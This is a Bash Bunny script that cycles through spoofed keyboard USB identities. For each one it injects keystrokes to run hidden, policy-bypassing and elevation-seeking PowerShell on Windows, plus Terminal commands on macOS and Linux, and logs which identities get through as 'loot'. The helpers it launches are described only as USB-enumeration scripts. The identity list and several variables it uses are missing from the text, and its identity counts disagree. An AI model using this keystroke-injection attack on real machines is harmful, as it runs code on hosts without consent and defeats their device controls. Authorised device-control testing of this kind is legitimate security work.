# =============================================================================
#  Payload   : keyboard-id-spoof-test
#  Author    : <operator>
#  Device    : Bash Bunny Mark I / Mark II
#  Version   : 1.0
#
#  Purpose   : Iterates through 100 keyboard USB identities (VID/PID/MFR/PROD/SER)
#              via HID spoofing. For each identity the BB presents itself as that
#              keyboard, injects keystrokes to run a staged validation helper on
#              the target, and checks whether the target wrote output back to
#              BashBunny STORAGE. Results are saved per-identity and aggregated
#              in a summary table.
#
#              Entry 0 is the Bash Bunny's own native VID 0xF000. If the native
#              test succeeds it is annotated as such in summary.txt.
#
#  Runtime   : ~15–20 min (109 identities × ~9 s each)
#              Reduce WAIT_CMD if target responds quickly.
#
#  Loot (retrieve via STORAGE mode after run):
#    BashBunny:\summary.txt             — pass/fail table for all identities
#    BashBunny:\results\<VID>_<PID>.txt — per-identity USB enumeration output
#
#  Helper scripts (staged from this folder to STORAGE):
#    kbtest_win.ps1    — Windows WMI/PnP enumeration
#    kbtest_unix.sh    — macOS ioreg / Linux lsusb + udevadm enumeration
#
#  Deploy:
#    1. Copy this folder to /payloads/switch1/  (or switch2/)
#    2. Ensure kbtest_unix.sh is executable: chmod +x .../kbtest_unix.sh
#    3. Plug BB into target with switch in position 1 (or 2)
#
#  LED convention:
#    Magenta solid  — setup: staging helper scripts
#    Cyan solid     — iterating: switching to next identity
#    Yellow fast    — attack: injecting keystrokes
#    Green blink    — success: result file received from target
#    Red blink      — timeout: no result file; identity may have been blocked
#    Green solid    — finish: all identities tested
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
# Stage helper scripts onto STORAGE (udisk) at payload start
# ─────────────────────────────────────────────────────────────────────────────
LED SETUP

mkdir -p "$RESULTS_DIR"
cp "${PAYLOAD_DIR}/kbtest_win.ps1"  "${UDISK}/kbtest_win.ps1"
cp "${PAYLOAD_DIR}/kbtest_unix.sh"  "${UDISK}/kbtest_unix.sh"
chmod +x "${UDISK}/kbtest_unix.sh"

PASS=0
FAIL=0
TOTAL=${#KEYBOARDS[@]}

{
    echo "=== keyboard-id-spoof-test: Summary ==="
    echo "Started   : $(date '+%Y-%m-%d %H:%M:%S')"
    echo "Identities: $((TOTAL - 1)) spoofed + 1 native"
    echo ""
    printf "%-6s %-6s %-22s %-30s %-10s %s\n" "VID" "PID" "Manufacturer" "Product" "Serial" "Result"
    printf "%-6s %-6s %-22s %-30s %-10s %s\n" "------" "------" "----------------------" "------------------------------" "----------" "-------"
} > "$SUMMARY"

# ─────────────────────────────────────────────────────────────────────────────
# Main loop: iterate through all keyboard identities
# ─────────────────────────────────────────────────────────────────────────────
IDX=0
for entry in "${KEYBOARDS[@]}"; do
    read -r vid pid mfr prod ser <<< "$entry"

    LED CYAN

    # Determine if this is the native test (index 0) or a spoofed identity
    if [ "$IDX" -eq 0 ]; then
        SPOOF_MODE="NATIVE"
        NOTE="[Bash Bunny native VID 0xF000]"
    else
        SPOOF_MODE="SPOOFED"
        NOTE=""
    fi

    # ── Write current identity to udisk (target will read this via STORAGE) ──
    echo "$vid $pid $mfr $prod $ser $SPOOF_MODE" > "${UDISK}/current_test.txt"

    # ── Set USB personality ───────────────────────────────────────────────────
    if [ "$IDX" -eq 0 ]; then
        # Native: no VID/PID override
        ATTACKMODE HID STORAGE
    else
        ATTACKMODE HID STORAGE VID_${vid} PID_${pid} MAN_"${mfr}" PROD_"${prod}" SER_"${ser}"
    fi

    # Wait for target OS to enumerate the (re-)presented USB device
    sleep $WAIT_ENUM

    LED ATTACK
    DUCKY_LANG us

    # ── Windows: Run dialog → PowerShell → kbtest_win.ps1 ────────────────────
    RUN WIN "powershell -W H -NoP -NonI -Exec Bypass -C \"\$b=((gwmi Win32_Volume|?{\$_.Label -eq 'BashBunny'})|Select -First 1).Name;if(\$b){Start-Process powershell -W H -Verb RunAs -Args '-W H -NoP -NonI -Exec Bypass -F \\\"'+\$b+'kbtest_win.ps1\\\"' -EA SilentlyContinue;powershell -W H -NoP -NonI -Exec Bypass -F \\\"\$b\\kbtest_win.ps1\\\"}\""

    Q DELAY 1500

    # ── macOS: Spotlight → Terminal → kbtest_unix.sh ──────────────────────────
    RUN OSX "osascript -e 'tell application \"Terminal\" to do script \"bash /Volumes/BashBunny/kbtest_unix.sh 2>/dev/null &\"'"

    Q DELAY 1000

    # ── Linux: Ctrl+Alt+T → kbtest_unix.sh (tries common mount paths) ─────────
    Q CTRL ALT t
    Q DELAY 1500
    Q STRING bash /run/media/$USER/BashBunny/kbtest_unix.sh 2>/dev/null || bash /media/$USER/BashBunny/kbtest_unix.sh 2>/dev/null || bash /media/BashBunny/kbtest_unix.sh 2>/dev/null &
    Q ENTER
    Q DELAY 500
    Q ALT F4

    # ── Wait for target to write result file ──────────────────────────────────
    sleep $WAIT_CMD

    # ── Check for result ──────────────────────────────────────────────────────
    RESULT_FILE="${RESULTS_DIR}/${vid}_${pid}.txt"
    if [ -f "$RESULT_FILE" ]; then
        STATUS="SUCCESS"
        PASS=$((PASS + 1))
        LED GREEN FAST
        sleep 1
    else
        STATUS="TIMEOUT"
        FAIL=$((FAIL + 1))
        LED RED FAST
        sleep 1
        # Write a stub so the operator knows it was attempted
        {
            echo "=== keyboard-id-spoof-test: No response ==="
            echo "VID  : $vid   PID  : $pid"
            echo "MFR  : $mfr   PROD : $prod   SER  : $ser"
            echo "Mode : $SPOOF_MODE"
            echo "Note : Target did not write a result file within ${WAIT_CMD}s."
            echo "       The HID device may have been blocked, the terminal"
            echo "       did not open, or the helper script path was not found."
        } > "$RESULT_FILE"
    fi

    # Annotate native result with special note
    if [ "$IDX" -eq 0 ] && [ "$STATUS" = "SUCCESS" ]; then
        echo "" >> "$RESULT_FILE"
        echo "NOTE: This result was obtained using the Bash Bunny native identity" >> "$RESULT_FILE"
        echo "      (VID 0xF000). No USB device spoofing was applied." >> "$RESULT_FILE"
    fi

    # Append row to summary
    printf "%-6s %-6s %-22s %-30s %-10s %s %s\n" \
        "$vid" "$pid" "$mfr" "$prod" "$ser" "$STATUS" "$NOTE" >> "$SUMMARY"

    IDX=$((IDX + 1))
done

# ─────────────────────────────────────────────────────────────────────────────
# Finalise
# ─────────────────────────────────────────────────────────────────────────────
{
    echo ""
    echo "Finished  : $(date '+%Y-%m-%d %H:%M:%S')"
    echo "Passed    : $PASS / $((IDX - 1)) spoofed identities (+ native)"
    echo "Failed    : $FAIL"
    echo ""
    echo "Retrieve loot:"
    echo "  STORAGE mode: plug BB and open BashBunny:\\ on host"
    echo "  SSH (arming): ssh root@172.16.64.1  →  /root/udisk/results/"
} >> "$SUMMARY"

if [ "$PASS" -gt 0 ]; then
    LED FINISH
else
    LED FAIL
fi

sleep 3
LED OFF
